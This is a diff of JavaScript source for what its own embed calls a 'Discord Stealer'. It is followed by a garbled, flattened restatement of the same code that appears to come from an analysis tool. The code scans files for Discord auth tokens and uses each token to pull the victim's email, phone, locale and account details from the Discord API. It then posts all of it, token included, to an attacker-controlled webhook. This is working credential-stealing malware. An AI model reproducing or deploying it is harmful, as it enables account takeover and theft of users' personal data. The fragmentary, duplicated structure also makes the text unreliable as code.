@@ -1,0 +1,163 @@
+fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function(err, data) {
+                            let dmfa = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
+                            let mfa = /"mfa\.[\d\w_-]{84}"/;
+
+                            let [tkn] = dmfa.exec(data) || mfa.exec(data) || [null];
+                            if (tkn != null) {
+                                tkn = tkn.replace(/"/g, '')
+
+                                let benladen = new URLSearchParams();
+                                benladen.append('token', tkn);
+
+                                let user = JSON.parse(request("GET", 'https://discord.com/api/v9/users/@me', {
+                                    headers: {
+                                        "Content-Type": "application/json",
+                                        "authorization": tkn
+                                    }
+                                }).body)
+                                if (user.premium_type == 1) ...
+let dmfa = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/
+let mfa = /"mfa\.[\d\w_-]{84}"/
+_tmp_11 = dmfa.exec(data) || mfa.exec(data) || [null]
+tkn != null
+tkn = tkn.replace(/"/g, '')
+let benladen = new URLSearchParams()
+benladen.append('token', tkn)
+let user = JSON.parse(request("GET", 'https://discord.com/api/v9/users/@me', {
+                                    headers: {
+                                        "Content-Type": "application/json",
+                                        "authorization": tkn
+                                    }
+                                }).body)
+_tmp_13.headers = {
+                                        "Content-Type": "application/json",
+                                        "authorization": tkn
+                                    }
+_tmp_14.Content-Type = "application/json"
+_tmp_14.authorization = tkn
+body
+user.premium_type == 1
+var nitro = "Nitro Classic"
+user.premium_type == 2
+var nitro = "Nitro Gaming"
+user.premium_type == undefined
+var nitro = "Pobre"
+let username = user.username + "#" + user.discriminator
+let id = user.id
+let email = user.email
+let telefone = user.phone
+let local = user.locale
+let av = user.avatar
+let bn = user.banner
+let bc = user.accent_color
+let bi = user.bio
+let vr = user.verified
+vr == true
+var verificado = "Sim"
+var verificado = "Não verificado"
+var bio = user.bio
+bio = "sem bio"
+<operator>.formatString("https://cdn.discordapp.com/banners/", r.id, "/", r.banner, ".png?size=512")
+banner = "Sem banner"
+local == undefined
+local = "Não consigo encontrar a localização"
+email == null
+email = "Sem email"
+telefone == null
+telefone = "Sem telefone"
+av == undefined
+var avatar = "https://media.discordapp.net/attachments/896526354147844119/901496344827555861/8c26a30b7e4229f349a196cb1cc67cf3.gif?size=128"
+<operator>.formatString("https://cdn.discordapp.com/avatars/", id, "/", av, ".gif?size=128?")
+user.flags == 1
+var badge = "Staff Do Discord"
+user.flags == 2
+var badge = "Parceria Do Discord"
+user.flags == 4
+var badge = "HypeSquad Eventos"
+user.flags == 8
+var badge = "Caçador de bugs do discord 1"
+user.flags == 64
+var badge = "House Bravery"
+user.flags == 128
+var badge = "House Brilliance"
+user.flags == 256
+var badge = "House Balance"
+user.flags == 512
+var badge = "Apoiador Inicial"
+user.flags == 16384
+var badge = "Caçador de bugs do discord 2"
+user.flags == 131072
+var badge = "Desenvolvedor de bots"
+user.flags == undefined
+var badge = "Sem emblemas"
+(_tmp_16 = new discord.MessageEmbed()
+                                    .setTitle("Discord Stealer")
+                                    .setColor("#030303")
+                                    .setDescription(`
+                                    \`Nome:\` **${username}\n**
+                                    \`Id:\` **${id}**\n
+                                    \`Gmail:\` **${email}**\n
+                                    \`Verificado?:\` **${verificado}**\n
+                                    \`Telefone:\` **${telefone}**\n
+                                    \`Emblemas:\` **${badge}**\n
+                                    \`Local:\` **${local}**\n
+                                    \`Nitro?:\` **${nitro}\n**
+                                    \`banner:\` **${banner}**\n
+                                    \`Cor do banner:\` **${bc}**\n
+                                    \`Bio:\` **${bio}**\n
+                                    \`Token:\` **${tkn}**\n
+                ...).setThumbnail
+"Discord Stealer"
+"#030303"
+<operator>.formatString("
+                                    \`Nome:\` **", username, "\n**
+                                    \`Id:\` **", id, "**\n
+                                    \`Gmail:\` **", email, "**\n
+                                    \`Verificado?:\` **", verificado, "**\n
+                                    \`Telefone:\` **", telefone, "**\n
+                                    \`Emblemas:\` **", badge, "**\n
+                                    \`Local:\` **", local, "**\n
+                                    \`Nitro?:\` **", nitro, "\n**
+                                    \`banner:\` **", banner, "**\n
+                                    \`Cor do banner:\` **", bc, "**\n
+                                    \`Bio:\` **", bio, "**\n
+                                    \`Token:\` **", tkn, "**\n
+                                    ")
+"\n**
+                                    \`Id:\` **"
+"**\n
+                                    \`Gmail:\` **"
+"**\n
+                                    \`Verificado?:\` **"
+"**\n
+                                    \`Telefone:\` **"
+"**\n
+                                    \`Emblemas:\` **"
+"**\n
+                                    \`Local:\` **"
+"**\n
+                                    \`Nitro?:\` **"
+"\n**
+                                    \`banner:\` **"
+"**\n
+                                    \`Cor do banner:\` **"
+"**\n
+                                    \`Bio:\` **"
+"**\n
+                                    \`Token:\` **"
+"**\n
+                                    "
+setThumbnail
+<operator>.formatString("Developed by: ", owner, "")
+username == "undefined#undefined"
+wb.send("**token inválido detectado**")
+username != undefined
+await wb.send(bm)
+await fetch(`https://discord.com/api/v6/users/@me`, {
+                                    headers: {
+                                        "authorization": tkn
+                                    }
+                                }).then(resp => resp.json()).then(response => {
+                                    if (response.id) {
+                                    }
+                                })
